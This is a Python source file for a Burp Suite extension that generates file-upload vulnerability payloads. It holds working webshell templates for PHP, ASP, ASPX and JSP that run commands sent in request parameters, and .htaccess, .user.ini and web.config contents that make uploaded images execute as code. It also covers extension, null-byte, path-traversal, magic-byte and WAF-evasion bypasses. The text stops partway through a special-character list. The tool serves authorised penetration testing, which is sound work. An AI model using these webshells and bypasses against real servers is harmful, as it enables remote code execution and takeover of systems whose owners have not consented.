# -*- coding: utf-8 -*-
"""
Upload Auto Fuzz - Burp Suite Extension for File Upload Vulnerability Testing

A comprehensive file upload vulnerability testing tool that generates intelligent
payloads to bypass various security mechanisms including WAF, content-type validation,
extension filtering, and more.

Architecture:
    - Strategy Pattern: Each bypass technique is encapsulated as a FuzzStrategy
    - Factory Pattern: PayloadFactory manages strategy registration and payload generation
    - Template Method: Base class defines the generation skeleton, subclasses implement specifics

Author: T3nk0
Version: 1.2.0
License: MIT
"""

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from burp import ITab
from javax.swing import (JPanel, JCheckBox, JLabel, JButton,
                         BoxLayout, BorderFactory, UIManager,
                         JScrollPane, JTextArea, SwingUtilities)
from javax.swing.border import TitledBorder
from java.awt import (GridBagLayout, GridBagConstraints, Insets, Dimension,
                      FlowLayout, Font, Color, BorderLayout)
import re
import base64
import hashlib
from abc import ABCMeta, abstractmethod


# =============================================================================
# Constants and Configuration
# =============================================================================

VERSION = "1.2.0"
EXTENSION_NAME = "Upload_Auto_Fuzz {}".format(VERSION)
MAX_PAYLOADS_DEFAULT = 2000
MAX_FILENAME_LENGTH = 255


# Supported backend languages with their executable extensions
BACKEND_LANGUAGES = {
    'php': ['php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phpt', 'phar', 'pgif'],
    'asp': ['asp', 'asa', 'cer', 'cdx', 'htr'],
    'aspx': ['aspx', 'ashx', 'asmx', 'asax'],
    'jsp': ['jsp', 'jspa', 'jsps', 'jspx', 'jspf'],
}

# Common image MIME types for bypass
IMAGE_MIME_TYPES = [
    'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
    'image/webp', 'image/svg+xml', 'image/tiff'
]

# Magic bytes for file type spoofing
MAGIC_BYTES = {
    'jpg': '\xff\xd8\xff\xe0',
    'png': '\x89PNG\r\n\x1a\n',
    'gif': 'GIF89a',
    'gif87': 'GIF87a',
    'bmp': 'BM',
    'pdf': '%PDF-1.5',
    'zip': 'PK\x03\x04',
}

# WebShell templates for different languages
WEBSHELL_TEMPLATES = {
    'php': [
        '<?php eval($_POST["cmd"]); ?>',
        '<?php system($_REQUEST["cmd"]); ?>',
        '<?= `$_GET[0]`; ?>',
        '<?php $_GET[a]($_GET[b]); ?>',
    ],
    'asp': [
        '<%eval request("cmd")%>',
        '<%execute request("cmd")%>',
    ],
    'aspx': [
        '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>',
    ],
    'jsp': [
        '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
        '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
    ],
}


# =============================================================================
# Utility Functions
# =============================================================================

class Logger(object):
    """Centralized logging utility for the extension."""
    
    _callbacks = None
    _enabled = True
    
    @classmethod
    def init(cls, callbacks):
        cls._callbacks = callbacks
    
    @classmethod
    def info(cls, message):
        if cls._enabled:
            print("[INFO] {}".format(message))
    
    @classmethod
    def debug(cls, message):
        if cls._enabled:
            print("[DEBUG] {}".format(message))
    
    @classmethod
    def error(cls, message):
        print("[ERROR] {}".format(message))
    
    @classmethod
    def warn(cls, message):
        print("[WARN] {}".format(message))


def safe_url_decode(encoded_str):
    """
    Safely decode URL-encoded string without external dependencies.
    
    Args:
        encoded_str: URL-encoded string (e.g., '%00', '%20')
    
    Returns:
        Decoded string
    """
    result = []
    i = 0
    while i < len(encoded_str):
        if encoded_str[i] == '%' and i + 2 < len(encoded_str):
            try:
                hex_val = encoded_str[i+1:i+3]
                result.append(chr(int(hex_val, 16)))
                i += 3
            except ValueError:
                result.append(encoded_str[i])
                i += 1
        else:
            result.append(encoded_str[i])
            i += 1
    return ''.join(result)


def compute_payload_hash(payload):
    """
    Compute a unique hash for payload deduplication.
    
    Args:
        payload: The payload string
    
    Returns:
        MD5 hash string of the payload
    """
    if isinstance(payload, unicode):
        payload = payload.encode('utf-8')
    return hashlib.md5(payload).hexdigest()


def safe_regex_search(pattern, text, default=None):
    """
    Safely perform regex search with error handling.
    
    Args:
        pattern: Regex pattern string
        text: Text to search in
        default: Default value if no match found
    
    Returns:
        Match object or default value
    """
    try:
        match = re.search(pattern, text, re.DOTALL)
        return match if match else default
    except re.error as e:
        Logger.error("Regex error: {}".format(str(e)))
        return default


def extract_filename_parts(template):
    """
    Extract filename and extension from Content-Disposition header.
    
    Args:
        template: HTTP request template containing Content-Disposition
    
    Returns:
        Tuple of (full_filename, extension, filename_match_group)
        Returns (None, None, None) if extraction fails
    """
    # Try different filename patterns
    patterns = [
        r'filename="([^"]+)"',      # Standard: filename="test.jpg"
        r"filename='([^']+)'",      # Single quotes: filename='test.jpg'
        r'filename=([^\s;]+)',      # No quotes: filename=test.jpg
    ]
    
    for pattern in patterns:
        match = safe_regex_search(pattern, template)
        if match:
            filename = match.group(1)
            if '.' in filename:
                ext = filename.rsplit('.', 1)[-1]
                return filename, ext, match.group(0)
            return filename, '', match.group(0)
    
    return None, None, None


def extract_content_type(template):
    """
    Extract Content-Type value from template.
    
    Args:
        template: HTTP request template
    
    Returns:
        Content-Type string or None
    """
    match = safe_regex_search(r'Content-Type:\s*([^\r\n]+)', template)
    return match.group(1).strip() if match else None


# =============================================================================
# Payload Generation Configuration
# =============================================================================

class FuzzConfig(object):
    """
    Configuration container for payload generation.
    Implements Singleton pattern for global access within a session.
    """
    
    _instance = None
    
    def __new__(cls, force_new=False):
        """
        Create or return singleton instance.
        
        Args:
            force_new: If True, create a new instance (for testing)
        """
        if cls._instance is None or force_new:
            cls._instance = object.__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, force_new=False):
        if self._initialized and not force_new:
            return
        
        # Target languages to test (default: all)
        self.target_languages = ['php', 'asp', 'aspx', 'jsp']
        
        # Enabled strategy categories (default: all enabled)
        self.enabled_strategies = {
            'suffix': True,
            'content_disposition': True,
            'content_type': True,
            'windows_features': True,
            'linux_features': True,
            'magic_bytes': True,
            'null_byte': True,
            'double_extension': True,
            'case_variation': True,
            'special_chars': True,
            'encoding': True,
            'waf_bypass': True,
            'webshell_content': True,
            'config_files': True,
        }
        
        # Maximum payloads to generate (default: 2000)
        self.max_payloads = MAX_PAYLOADS_DEFAULT
        
        # Include webshell content in payloads
        self.include_webshell = True
        
        self._initialized = True
    
    @classmethod
    def reset(cls):
        """Reset the singleton instance (useful for testing)."""
        cls._instance = None
    
    def set_target_languages(self, languages):
        """Set target backend languages."""
        valid_langs = [l for l in languages if l in BACKEND_LANGUAGES]
        if valid_langs:
            self.target_languages = valid_langs
    
    def enable_strategy(self, strategy_name, enabled=True):
        """Enable or disable a specific strategy."""
        if strategy_name in self.enabled_strategies:
            self.enabled_strategies[strategy_name] = enabled
    
    def is_strategy_enabled(self, strategy_name):
        """Check if a strategy is enabled."""
        return self.enabled_strategies.get(strategy_name, False)


# =============================================================================
# Abstract Base Strategy
# =============================================================================

class FuzzStrategy(object):
    """
    Abstract base class for all fuzzing strategies.
    
    Each strategy encapsulates a specific bypass technique and generates
    payloads accordingly. Strategies are designed to be composable and
    independently testable.
    """
    
    __metaclass__ = ABCMeta
    
    # Strategy metadata
    name = "base"
    description = "Base fuzzing strategy"
    category = "general"
    
    def __init__(self, config=None):
        """
        Initialize strategy with configuration.
        
        Args:
            config: FuzzConfig instance or None for default
        """
        self.config = config or FuzzConfig()
    
    @abstractmethod
    def generate(self, template, filename, extension, content_type):
        """
        Generate payloads for this strategy.
        
        Args:
            template: Original HTTP request template
            filename: Original filename (e.g., "test.jpg")
            extension: Original file extension (e.g., "jpg")
            content_type: Original Content-Type value
        
        Yields:
            Modified template strings as payloads
        """
        pass
    
    def _replace_filename(self, template, old_filename_match, new_filename):
        """
        Helper to replace filename in template.
        
        Args:
            template: Original template
            old_filename_match: The matched filename string (e.g., 'filename="test.jpg"')
            new_filename: New filename to use
        
        Returns:
            Modified template string
        """
        new_match = 'filename="{}"'.format(new_filename)
        return template.replace(old_filename_match, new_match)
    
    def _replace_content_type(self, template, old_ct, new_ct):
        """
        Helper to replace Content-Type in template.
        
        Args:
            template: Original template
            old_ct: Old Content-Type value
            new_ct: New Content-Type value
        
        Returns:
            Modified template string
        """
        return template.replace(
            'Content-Type: {}'.format(old_ct),
            'Content-Type: {}'.format(new_ct)
        )
    
    def _get_target_extensions(self):
        """Get list of target extensions based on configured languages."""
        extensions = []
        for lang in self.config.target_languages:
            if lang in BACKEND_LANGUAGES:
                extensions.extend(BACKEND_LANGUAGES[lang])
        return list(set(extensions))


# =============================================================================
# Concrete Fuzzing Strategies
# =============================================================================

class SuffixBypassStrategy(FuzzStrategy):
    """
    Strategy for file extension/suffix bypass techniques.
    
    Techniques include:
    - Alternative executable extensions
    - Case variations
    - Null byte injection
    - Double extensions
    - Special character injection
    """
    
    name = "suffix"
    description = "File extension bypass techniques"
    category = "suffix"
    
    # Extension bypass patterns: {language: [bypass_patterns]}
    BYPASS_PATTERNS = {
        'php': [
            # Alternative extensions
            'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phar', 'phps',
            'php1', 'php2', 'pgif',
            # Case variations
            'pHp', 'PhP', 'PHP', 'pHP', 'PHp', 'phP',
            # 双写绕过
            'pphphp', 'phphpp', 'pphp',
            # Null byte variations
            'php%00', 'php%00.jpg', 'php\x00.jpg',
            # Double extensions
            'php.jpg', 'php.png', 'php.gif', 'jpg.php', 'png.php',
            # Special characters
            'php ', 'php.', 'php..', 'php::$DATA', 'php:$DATA',
            # Semicolon bypass (IIS)
            'php;.jpg', 'php;jpg', 'php;.png',
            # Path separator tricks
            'php/.jpg', 'php\\.jpg',
            # Encoding tricks
            'p%68p', '%70hp', 'ph%70',
            # 文件名中间插入特殊字符
            'p;hp', 'p hp', 'ph p', 'p.hp',
        ],
        'asp': [
            'asa', 'cer', 'cdx', 'htr',
            'asp ', 'asp.', 'asp;.jpg', 'asp;jpg',
            'asp%00', 'asp%00.jpg', 'asp::$DATA',
            'aSp', 'AsP', 'ASP', 'aSP', 'Asp',
            # 双写绕过
            'aspasp', 'aasps', 'aspas',
            # 文件名中间插入特殊字符
            'a;sp', 'as p', 'a.sp',
        ],
        'aspx': [
            'ashx', 'asmx', 'asax', 'ascx', 'soap', 'rem', 'axd',
            'aspx ', 'aspx.', 'aspx;.jpg',
            'aSpX', 'ASPX', 'AsPx', 'ASpx', 'aspX',
            # 双写绕过
            'aspxaspx', 'aaspxspx',
        ],
        'jsp': [
            'jspa', 'jsps', 'jspx', 'jspf', 'jsw', 'jsv', 'jtml',
            'jsp ', 'jsp.', 'jsp;.jpg',
            'jSp', 'JsP', 'JSP', 'jSP', 'Jsp',
            'jsp%00', 'jsp%00.jpg',
            # 双写绕过
            'jspjsp', 'jjsps',
        ],
    }
    
    def generate(self, template, filename, extension, content_type):
        """Generate suffix bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        generated = set()
        
        for lang in self.config.target_languages:
            if lang not in self.BYPASS_PATTERNS:
                continue
            
            for pattern in self.BYPASS_PATTERNS[lang]:
                new_filename = "{}.{}".format(base_name, pattern)
                
                # Skip if already generated
                if new_filename in generated:
                    continue
                generated.add(new_filename)
                
                # Truncate if too long
                if len(new_filename) > MAX_FILENAME_LENGTH:
                    continue
                
                yield self._replace_filename(template, filename_match, new_filename)


class ContentDispositionStrategy(FuzzStrategy):
    """
    Strategy for Content-Disposition header manipulation.
    
    Techniques include:
    - Header name case variations
    - Spacing manipulation
    - Quote variations
    - Multiple filename parameters
    - Special character injection
    - form-data pollution
    """
    
    name = "content_disposition"
    description = "Content-Disposition header bypass techniques"
    category = "content_disposition"
    
    def generate(self, template, filename, extension, content_type):
        """Generate Content-Disposition bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]  # Primary extension
            
            # Case variations for Content-Disposition
            cd_variations = [
                ('Content-Disposition', 'content-disposition'),
                ('Content-Disposition', 'CONTENT-DISPOSITION'),
                ('Content-Disposition', 'Content-disposition'),
                ('Content-Disposition', 'ConTENT-DisPoSition'),  # 混合大小写
                ('Content-Disposition: ', 'Content-Disposition:'),
                ('Content-Disposition: ', 'Content-Disposition:  '),
                ('Content-Disposition: ', 'Content-Disposition:\t'),
            ]
            
            for old, new in cd_variations:
                if old in template:
                    modified = template.replace(old, new)
                    modified = self._replace_filename(modified, filename_match, 
                                                     "{}.{}".format(base_name, ext))
                    yield modified
            
            # form-data variations
            fd_variations = [
                ('form-data', 'Form-Data'),
                ('form-data', 'FORM-DATA'),
                ('form-data', 'form-Data'),
                ('form-data', 'form-datA'),
                ('form-data; ', 'form-data;'),
                ('form-data; ', 'form-data;  '),
                ('form-data', '*'),
                ('form-data', 'f+orm-data'),
                # form-data 污染 - 替换为脏数据
                ('form-data', 'AAAA="BBBB"'),
                # 删除 form-data
                ('form-data; ', ''),
                # 多分号污染
                ('form-data;', 'form-data;;;;;;;;;;'),
                ('form-data;', 'form-datA*;;;;;;;;;;'),
            ]
            
            for old, new in fd_variations:
                if old in template:
                    modified = template.replace(old, new)
                    modified = self._replace_filename(modified, filename_match,
                                                     "{}.{}".format(base_name, ext))
                    yield modified
            
            # Filename parameter variations
            filename_variations = [
                # Quote variations
                'filename={}.{}'.format(base_name, ext),
                "filename='{}.{}'".format(base_name, ext),
                'filename=`{}.{}`'.format(base_name, ext),
                # 未闭合引号
                'filename="{}.{}'.format(base_name, ext),
                "filename='{}.{}".format(base_name, ext),
                'filename="{}.{}\''.format(base_name, ext),  # 混合引号
                # Multiple equals
                'filename=="{}.{}"'.format(base_name, ext),
                'filename==="{}.{}"'.format(base_name, ext),
                'filename===="{}.{}"'.format(base_name, ext),
                # 超多等号
                'filename' + '=' * 50 + '"{}.{}"'.format(base_name, ext),
                # Newline injection
                'filename="{}.{}"\n'.format(base_name, ext),
                'filename\n="{}.{}"'.format(base_name, ext),
                'filename=\n"{}.{}"'.format(base_name, ext),
                # Double filename (parameter pollution)
                'filename="safe.jpg"; filename="{}.{}"'.format(base_name, ext),
                'filename="{}.{}"; filename="safe.jpg"'.format(base_name, ext),
                'filename="1.jpg";filename="{}.{}"'.format(base_name, ext),
                # 空 filename 在前
                'filename= ;filename="{}.{}"'.format(base_name, ext),
                'filename="";filename="{}.{}"'.format(base_name, ext),
                # Backslash
                'filename="{}\\{}"'.format(base_name, ext),
                # 多分号污染
                'filename;;;;="{}.{}"'.format(base_name, ext),
                'filename;;;;;;;;;;;;;;="{}.{}"'.format(base_name, ext),
                # name 参数污染
                'name="file";;;;;;;;;;;; filename="{}.{}"'.format(base_name, ext),
            ]
            
            for variation in filename_variations:
                yield template.replace(filename_match, variation)


class ContentTypeStrategy(FuzzStrategy):
    """
    Strategy for Content-Type header manipulation.
    
    Techniques include:
    - MIME type spoofing
    - Header case variations
    - Empty/missing Content-Type
    - URL encoded Content-Type
    - Duplicate Content-Type headers
    """
    
    name = "content_type"
    description = "Content-Type header bypass techniques"
    category = "content_type"
    
    # MIME types to try
    MIME_TYPES = [
        'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
        'image/webp', 'image/svg+xml', 'image/tiff',
        'text/plain', 'text/html',
        'application/octet-stream',
        'application/x-httpd-php',
        'application/x-php',
        'application/x-asp',
        'multipart/form-data',
        # 可执行类型伪装为图片
        'image/php',
        'image/asp',
        'image/aspx',
        'image/jsp',
    ]
    
    def generate(self, template, filename, extension, content_type):
        """Generate Content-Type bypass payloads."""
        if not content_type:
            return
        
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Replace filename first
            modified_template = self._replace_filename(template, filename_match,
                                                       "{}.{}".format(base_name, ext))
            
            # Try different MIME types
            for mime in self.MIME_TYPES:
                yield self._replace_content_type(modified_template, content_type, mime)
            
            # URL encoded Content-Type
            url_encoded_types = [
                'image%2Fgif',
                'image%2Fjpeg',
                'image%2Fphp',
                'image%2F{}'.format(ext),
            ]
            for encoded_type in url_encoded_types:
                yield self._replace_content_type(modified_template, content_type, encoded_type)
            
            # Empty Content-Type
            yield modified_template.replace('Content-Type: {}'.format(content_type), '')
            
            # Case variations
            ct_variations = [
                ('Content-Type:', 'content-type:'),
                ('Content-Type:', 'CONTENT-TYPE:'),
                ('Content-Type: ', 'Content-Type:'),
                ('Content-Type: ', 'Content-Type:  '),
            ]
            
            for old, new in ct_variations:
                if old in modified_template:
                    yield modified_template.replace(old, new)
            
            # Duplicate Content-Type header (第二个覆盖第一个)
            if 'Content-Type:' in modified_template:
                # 在原 Content-Type 前添加一个
                double_ct = modified_template.replace(
                    'Content-Type: {}'.format(content_type),
                    'Content-Type: image/gif\r\nContent-Type: {}'.format(content_type)
                )
                yield double_ct
        
        # 不改文件名，只改 Content-Type 为可执行类型
        executable_types = [
            'application/x-httpd-php',
            'application/x-php',
            'text/x-php',
            'application/x-asp',
            'application/x-aspx',
        ]
        for exec_type in executable_types:
            yield self._replace_content_type(template, content_type, exec_type)


class WindowsFeaturesStrategy(FuzzStrategy):
    """
    Strategy exploiting Windows filesystem features.
    
    Techniques include:
    - NTFS Alternate Data Streams (ADS)
    - Short filename (8.3) format
    - Reserved device names
    - Path separator tricks
    """
    
    name = "windows_features"
    description = "Windows filesystem bypass techniques"
    category = "windows_features"
    
    # Windows reserved device names
    RESERVED_NAMES = ['con', 'aux', 'nul', 'prn', 'com1', 'com2', 'lpt1', 'lpt2']
    
    def generate(self, template, filename, extension, content_type):
        """Generate Windows-specific bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # NTFS Alternate Data Streams
            ads_patterns = [
                '{}.{}::$DATA'.format(base_name, ext),
                '{}.{}::$DATA......'.format(base_name, ext),
                '{}:{}'.format(base_name, ext),
            ]
            
            for pattern in ads_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # IIS semicolon bypass
            iis_patterns = [
                '{}.{};.jpg'.format(base_name, ext),
                '{}.{};.png'.format(base_name, ext),
                '{}.{};jpg'.format(base_name, ext),
            ]
            
            for pattern in iis_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # Reserved device names
            for device in self.RESERVED_NAMES:
                yield self._replace_filename(template, filename_match,
                                            '{}.{}'.format(device, ext))
            
            # Trailing dots and spaces (Windows strips these)
            trailing_patterns = [
                '{}.{}.'.format(base_name, ext),
                '{}.{}..'.format(base_name, ext),
                '{}.{} '.format(base_name, ext),
                '{}.{}. . .'.format(base_name, ext),
            ]
            
            for pattern in trailing_patterns:
                yield self._replace_filename(template, filename_match, pattern)


class LinuxFeaturesStrategy(FuzzStrategy):
    """
    Strategy exploiting Linux/Unix filesystem features.
    
    Techniques include:
    - Path traversal
    - Symbolic link tricks
    - Apache multi-extension handling
    - Null byte injection
    """
    
    name = "linux_features"
    description = "Linux/Unix filesystem bypass techniques"
    category = "linux_features"
    
    def generate(self, template, filename, extension, content_type):
        """Generate Linux-specific bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Apache multi-extension (AddHandler)
            apache_patterns = [
                '{}.{}.jpg'.format(base_name, ext),
                '{}.{}.png'.format(base_name, ext),
                '{}.{}.gif'.format(base_name, ext),
                '{}.jpg.{}'.format(base_name, ext),
            ]
            
            for pattern in apache_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # Path traversal attempts
            traversal_patterns = [
                '../{}.{}'.format(base_name, ext),
                '../../{}.{}'.format(base_name, ext),
                '../../../{}.{}'.format(base_name, ext),
                '..../{}.{}'.format(base_name, ext),
                '..\\{}.{}'.format(base_name, ext),
            ]
            
            for pattern in traversal_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # Dot prefix (hidden files)
            yield self._replace_filename(template, filename_match,
                                        '.{}.{}'.format(base_name, ext))
            
            # Trailing dot
            yield self._replace_filename(template, filename_match,
                                        '{}.{}.'.format(base_name, ext))


class MagicBytesStrategy(FuzzStrategy):
    """
    Strategy for file magic bytes/signature spoofing.
    
    Prepends legitimate file signatures to bypass content-based detection.
    """
    
    name = "magic_bytes"
    description = "File magic bytes spoofing"
    category = "magic_bytes"
    
    def generate(self, template, filename, extension, content_type):
        """Generate magic bytes spoofing payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        # Find content section
        content_match = safe_regex_search(r'Content-Type:[^\r\n]*\r\n\r\n', template)
        if not content_match:
            return
        
        content_marker = content_match.group(0)
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Replace filename
            modified = self._replace_filename(template, filename_match,
                                             "{}.{}".format(base_name, ext))
            
            # Prepend magic bytes
            for magic_name, magic_bytes in MAGIC_BYTES.items():
                # Insert magic bytes after Content-Type header
                payload = modified.replace(content_marker, 
                                          content_marker + magic_bytes)
                yield payload


class NullByteStrategy(FuzzStrategy):
    """
    Strategy for null byte injection attacks.
    
    Exploits improper null byte handling in various languages/frameworks.
    """
    
    name = "null_byte"
    description = "Null byte injection techniques"
    category = "null_byte"
    
    # Various null byte representations
    NULL_VARIANTS = [
        '%00', '\\0', '\\x00', '\x00',
        '%2500',  # Double URL encoding
        '%u0000',  # Unicode null
    ]
    
    def generate(self, template, filename, extension, content_type):
        """Generate null byte injection payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            for null in self.NULL_VARIANTS:
                # Null byte before allowed extension
                patterns = [
                    '{}.{}{}.jpg'.format(base_name, ext, null),
                    '{}.{}{}jpg'.format(base_name, ext, null),
                    '{}{}.{}'.format(base_name, null, ext),
                ]
                
                for pattern in patterns:
                    yield self._replace_filename(template, filename_match, pattern)


class EncodingStrategy(FuzzStrategy):
    """
    Strategy for encoding-based bypass techniques.
    
    Techniques include:
    - URL encoding
    - Double URL encoding
    - Unicode encoding
    - Base64 encoding
    - MIME encoding (RFC 2047)
    """
    
    name = "encoding"
    description = "Encoding-based bypass techniques"
    category = "encoding"
    
    def generate(self, template, filename, extension, content_type):
        """Generate encoding bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            full_name = "{}.{}".format(base_name, ext)
            
            # URL encoding variations
            url_patterns = [
                '{}.%70%68%70'.format(base_name) if ext == 'php' else None,  # .php
                '{}.%61%73%70'.format(base_name) if ext == 'asp' else None,  # .asp
                '{}.%6a%73%70'.format(base_name) if ext == 'jsp' else None,  # .jsp
            ]
            
            for pattern in url_patterns:
                if pattern:
                    yield self._replace_filename(template, filename_match, pattern)
            
            # Double URL encoding
            double_encoded = '{}.%2570%2568%2570'.format(base_name) if ext == 'php' else None
            if double_encoded:
                yield self._replace_filename(template, filename_match, double_encoded)
            
            # MIME encoding (RFC 2047)
            try:
                b64_name = base64.b64encode(full_name)
                mime_patterns = [
                    '=?utf-8?B?{}?='.format(b64_name),
                    '=?utf-8?Q?{}?='.format(full_name.replace('.', '=2E')),
                ]
                
                for pattern in mime_patterns:
                    yield self._replace_filename(template, filename_match, pattern)
            except Exception:
                pass  # Skip if encoding fails
            
            # Unicode normalization bypass
            unicode_patterns = [
                u'{}.p\u0068p'.format(base_name) if ext == 'php' else None,
                u'{}.ph\u0070'.format(base_name) if ext == 'php' else None,
            ]
            
            for pattern in unicode_patterns:
                if pattern:
                    yield self._replace_filename(template, filename_match, pattern)


class WAFBypassStrategy(FuzzStrategy):
    """
    Strategy for Web Application Firewall bypass.
    
    Techniques include:
    - Header injection
    - Chunked encoding
    - Request smuggling patterns
    - Oversized payloads
    """
    
    name = "waf_bypass"
    description = "WAF bypass techniques"
    category = "waf_bypass"
    
    def generate(self, template, filename, extension, content_type):
        """Generate WAF bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Oversized filename (buffer overflow / WAF bypass)
            long_name = 'A' * 200 + '.{}'.format(ext)
            yield self._replace_filename(template, filename_match, long_name)
            
            # Filename with many dots
            dotted_name = '{}.....{}'.format(base_name, ext)
            yield self._replace_filename(template, filename_match, dotted_name)
            
            # Add junk headers before Content-Disposition
            if 'Content-Disposition:' in template:
                junk_header = 'X-Junk: ' + 'A' * 500 + '\r\n'
                modified = template.replace('Content-Disposition:', 
                                           junk_header + 'Content-Disposition:')
                modified = self._replace_filename(modified, filename_match,
                                                 '{}.{}'.format(base_name, ext))
                yield modified
            
            # Chunked transfer encoding header
            if 'Content-Type:' in template:
                chunked = template.replace('Content-Type:', 
                                          'Transfer-Encoding: chunked\r\nContent-Type:')
                chunked = self._replace_filename(chunked, filename_match,
                                                '{}.{}'.format(base_name, ext))
                yield chunked
            
            # Multiple Content-Disposition headers
            if 'Content-Disposition:' in template:
                double_cd = template.replace(
                    'Content-Disposition:',
                    'Content-Disposition: form-data; name="decoy"; filename="safe.jpg"\r\nContent-Disposition:'
                )
                double_cd = self._replace_filename(double_cd, filename_match,
                                                  '{}.{}'.format(base_name, ext))
                yield double_cd


class ConfigFileStrategy(FuzzStrategy):
    """
    Strategy for uploading configuration files that enable code execution.
    
    Files include:
    - .htaccess (Apache) - SetHandler to parse all files as PHP
    - .user.ini (PHP) - auto_prepend_file to include malicious file
    - web.config (IIS) - handlers configuration
    """
    
    name = "config_files"
    description = "Configuration file upload techniques"
    category = "config_files"
    
    # Config files that can enable code execution
    CONFIG_FILES = [
        '.htaccess',
        '.user.ini',
        'web.config',
        '.php.ini',
        'php.ini',
    ]
    
    # Config file contents for code execution
    CONFIG_CONTENTS = {
        '.htaccess': [
            'SetHandler application/x-httpd-php',
            'AddType application/x-httpd-php .jpg',
            'AddType application/x-httpd-php .png',
            'AddType application/x-httpd-php .gif',
            '<FilesMatch ".*">\nSetHandler application/x-httpd-php\n</FilesMatch>',
        ],
        '.user.ini': [
            'auto_prepend_file=shell.gif',
            'auto_prepend_file=1.gif',
            'auto_append_file=shell.gif',
        ],
        'web.config': [
            '<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n<system.webServer>\n<handlers>\n<add name="aspx" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />\n</handlers>\n</system.webServer>\n</configuration>',
        ],
    }
    
    def generate(self, template, filename, extension, content_type):
        """Generate config file upload payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        # Find content section for replacing file content
        content_match = safe_regex_search(
            r'(Content-Type:[^\r\n]*\r\n\r\n)(.*?)(?:\r\n--|\Z)', 
            template, 
            re.DOTALL
        )
        
        for config_file in self.CONFIG_FILES:
            # Just change filename
            yield self._replace_filename(template, filename_match, config_file)
            
            # Change filename and content
            if content_match and config_file in self.CONFIG_CONTENTS:
                content_header = content_match.group(1)
                original_content = content_match.group(2)
                
                modified = self._replace_filename(template, filename_match, config_file)
                
                for config_content in self.CONFIG_CONTENTS[config_file]:
                    if original_content:
                        payload = modified.replace(original_content, config_content)
                    else:
                        payload = modified.replace(content_header, content_header + config_content)
                    yield payload


class WebShellContentStrategy(FuzzStrategy):
    """
    Strategy for injecting webshell content into uploads.
    
    Combines filename bypass with actual webshell payloads.
    """
    
    name = "webshell_content"
    description = "WebShell content injection"
    category = "webshell_content"
    
    def generate(self, template, filename, extension, content_type):
        """Generate webshell content payloads."""
        if not self.config.include_webshell:
            return
        
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        # Find content section
        content_match = safe_regex_search(
            r'(Content-Type:[^\r\n]*\r\n\r\n)(.*?)(?:\r\n--|\Z)', 
            template, 
            re.DOTALL
        )
        
        if not content_match:
            return
        
        content_header = content_match.group(1)
        original_content = content_match.group(2)
        
        for lang in self.config.target_languages:
            if lang not in WEBSHELL_TEMPLATES:
                continue
            
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Replace filename
            modified = self._replace_filename(template, filename_match,
                                             "{}.{}".format(base_name, ext))
            
            for webshell in WEBSHELL_TEMPLATES[lang]:
                # Replace content with webshell
                if original_content:
                    payload = modified.replace(original_content, webshell)
                else:
                    # Append webshell after content header
                    payload = modified.replace(content_header, content_header + webshell)
                
                yield payload
                
                # With magic bytes prefix
                for magic_name, magic_bytes in MAGIC_BYTES.items():
                    prefixed_shell = magic_bytes + webshell
                    if original_content:
                        payload = modified.replace(original_content, prefixed_shell)
                    else:
                        payload = modified.replace(content_header, content_header + prefixed_shell)
                    yield payload


class SpecialCharacterStrategy(FuzzStrategy):
    """
    Strategy for special character injection in filenames.
    
    Tests various special characters that may cause parsing issues.
    """
    
    name = "special_chars"
    description = "Special character injection"
    category = "special_chars"
    
    # Special characters to test
    SPECIAL_CHARS = [
